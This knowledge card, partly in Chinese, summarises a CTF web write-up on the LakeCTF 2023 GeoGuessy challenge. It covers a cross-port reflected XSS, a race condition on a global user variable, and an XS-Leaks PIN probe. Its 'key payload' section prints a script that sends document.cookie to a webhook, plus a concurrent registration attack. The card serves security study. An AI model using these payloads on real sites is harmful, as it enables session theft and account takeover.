---
title: "XSS, Race Condition, XS-Leaks and CSP & iframe's sandbox bypass – LakeCTF 2023 GeoGuessy"
category: web
tags: ["LakeCTF 2023", "web", "dompurify_xss_bypass", "html_injection_username", "race_condition_global_user", "premium_pin_registration"]
signals: ["LakeCTF 2023 2023", "dompurify_xss_bypass", "html_injection_username", "race_condition_global_user", "premium_pin_registration", "bfcache_text_fragment", "xs_leak_anchor_text", "lazy_loading_image_scroll", "cookie_steal_xss", "logic", "LakeCTF", "GeoGuessy", "premium", "XSS"]
difficulty: hard
source: "https://www.ctfiot.com/146539.html"
tools: ["Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# XSS, Race Condition, XS-Leaks and CSP & iframe's sandbox bypass – LakeCTF 2023 GeoGuessy

> 赛事：LakeCTF 2023 2023 | 方向：web | 难度：hard | 工具：Python

## 一句话总结

LakeCTF 2023 GeoGuessy 三种 premium 取法：同域 9009 反射 XSS 跨端口 + 全局 user 变量 race condition 注册覆盖 + 预期解 XS-Leaks 锚文本懒加载图 bfcache 探测 PIN。

## 攻击链

1. Unintended #1:同域 9009 端口反射型 XSS "http://<script>alert(document.cookie)</script>:pass@chall.polygl0ts.ch:9009" + 用户名注入 [Click here to play!] 链接被 bot 重复 click 触发 → document.cookie 外带 / Unintended #2:bot 输入 premiumPin 时 race condition 改 user 全局变量 → 攻击者注册新用户成 premium / Intended:XS-Leaks 锚文本 + 懒加载图 + bfcache + Text Fragment https://example.com#:~:text=prefix-textStart,textEnd,-suffix → 滚动判断 PIN 数字

## 关键 payload

```
REFLECTED_XSS = urllib.parse.quote_plus(f"<script>fetch('{WEBHOOK}?'.concat(document.cookie))</script>") / XSS_STEAL_TOKEN = f'[Click here to play!](http://{REFLECTED_XSS}:pass@chall.polygl0ts.ch:9009/)' / python threading 30 路并发 register_and_check
```

## 经验教训

同一域名不同端口是 "同源策略绕过" 的常见盲点；全局变量在 Node.js Express 多请求 race condition 是云函数 + 共享内存模型的常见漏洞模式。

## 标签

dompurify_xss_bypass、html_injection_username、race_condition_global_user、premium_pin_registration、bfcache_text_fragment、xs_leak_anchor_text、lazy_loading_image_scroll、cookie_steal_xss、javascript_username_in_dom

## 参考来源

- https://www.ctfiot.com/146539.html
- 原文件：XSS,_Race_Condition,_XS-Leaks_and_CSP_&_iframe’s_sandbox_bypass_–_LakeCTF_2023_G.full.md
